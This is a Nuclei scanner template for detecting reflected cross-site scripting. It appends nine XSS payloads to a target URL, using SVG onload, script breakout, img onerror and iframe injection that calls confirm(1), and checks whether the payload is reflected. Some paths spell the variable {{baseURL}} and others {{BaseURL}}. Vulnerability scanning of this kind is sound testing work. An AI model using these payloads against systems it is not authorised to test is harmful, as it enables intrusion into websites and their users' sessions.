id: Reflected-XSS

info:
  name: Cross-Site Scripting (XSS) Nuclei Scanner
  author: twseptian
  severity: Medium
  description: XSS for GET HTTP Method
  reference: 
      - https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)
  tags: xss,cross-site-scripting

requests:
  - method: GET
    path:
      - "{{BaseURL}}'><Svg Only=1 OnLoad=confirm(1)>"
      - "{{baseURL}}'</TITLE><SCRIPT>confirm(1)%3b</SCRIPT>"
      - "{{BaseURL}}'><details/open/ontoggle=confirm(1)>"
      - "{{BaseURL}}'><svg><circle><set onbegin=confirm(1) attributename=fill>"
      - "{{BaseURL}}'6'%22()%26%25%22%3E%3Csvg/onload=confirm(1)%3E/"
      - "{{BaseURL}}'</script><img src=x onerror=confirm(1)>"
      - "{{BaseURL}}'<iframe/onload=confirm(1)>"
      - "{{baseURL}}'<style><img title=%22</style><img src onerror=confirm(1)>%22></style>"
      - "{{baseURL}}'<noscript><img title=%22</noscript><img src onerror=confirm(1)>%22></noscript>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
            - "confirm(1)"
        condition: and

      - type: status
        status:
          - 200
          - 500
          - 403
          - 301

      - type: word
        part: header
        words:
          - "text/html"